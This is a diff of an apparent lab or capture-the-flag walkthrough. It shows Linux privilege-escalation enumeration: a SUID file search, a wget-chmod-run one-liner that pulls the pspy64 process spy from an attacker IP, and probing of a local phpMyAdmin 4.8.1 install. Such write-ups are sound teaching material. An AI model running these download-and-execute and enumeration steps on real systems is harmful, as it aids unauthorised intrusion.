@@ -208,7 +208,6 @@ find / -perm -4000 -user root -type f 2>/dev/null
 /usr/lib/eject/dmcrypt-get-device
 ```
 
-
 <h2>pspy</h2>
 <p>
 
@@ -222,7 +221,6 @@ find / -perm -4000 -user root -type f 2>/dev/null
 ```bash
 ada@...:/tmp$ wget http://xx.xxx.x.xxx:8000/pspy64 -O /tmp/pspy64;chmod +x /tmp/pspy64;/tmp/pspy64
 ```
-
 
 <img width="1356" height="792" alt="image" src="https://github.com/user-attachments/assets/eabf20cd-5f9b-4c52-9248-39170318dc94" />
 
@@ -443,8 +441,6 @@ if __name__ == "__main__":
             commander.save_log()
 ```
 
-<br>
-<br>
 <h4>products.py</h4>
 <p>
 
@@ -471,27 +467,7 @@ for product in cursor.fetchall():
     print(f'We have {product[2]}x {product[1]}')
 ```
 
-
-<h4>README</h4>
-
-```bash
-ada@...:/var/www/phpmyadmin$ cat README | head
-cat README | head
-phpMyAdmin - Readme
-===================
-
-Version 4.8.1
-
-A web interface for MySQL and MariaDB.
-
-https://www.phpmyadmin.net/
-
-Summary
-```
-
-<br>
-<br>
-<h2>mysql</h2>
+<h4>mysql</h4>
 
 <p>
 
@@ -590,7 +566,9 @@ ada@...:~$ curl http://localhost:80/
                 <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
             </div>    <input type="hidden" name="server" value="1" /></fieldset><fieldset class="tblFooters"><input value="Go" type="submit" id="input_go" /><input type="hidden" name="target" value="index.php" /><input type="hidden" name="lang" value="en" /><input type="hidden" name="token" value=";)pB/Sc^o8D}pw%?" /></fieldset>
     </form></div>
-``` 
+```
+
+<h4>/var/www/phpmyadmin</h4>
 
 ```bash
 ada@...:/var/www/phpmyadmin$ ls
@@ -598,7 +576,9 @@ ajax.php                  robots.txt
 browse_foreigners.php     schema_export.php
 ChangeLog                 scripts
 changelog.php             server_binlog.php
-``` 
+```
+
+<h4>/var/www/phpmyadmin/scripts</h4>
 
 ```bash
 ada@...:/var/www/phpmyadmin/scripts$ ls
@@ -609,7 +589,27 @@ generate-mo           transformations_generator_plugin.sh
 generate-twig-cache   update-po
 lang-cleanup.sh       upload-release
 locales-contributors
-``` 
+```
+
+<h4>README</h4>
+<p>
+
+- phpmyadmin 4.8.1</p>
+
+```bash
+ada@...:/var/www/phpmyadmin$ cat README | head
+cat README | head
+phpMyAdmin - Readme
+===================
+
+Version 4.8.1
+
+A web interface for MySQL and MariaDB.
+
+https://www.phpmyadmin.net/
+
+Summary
+```
 
 <br>
 <br>
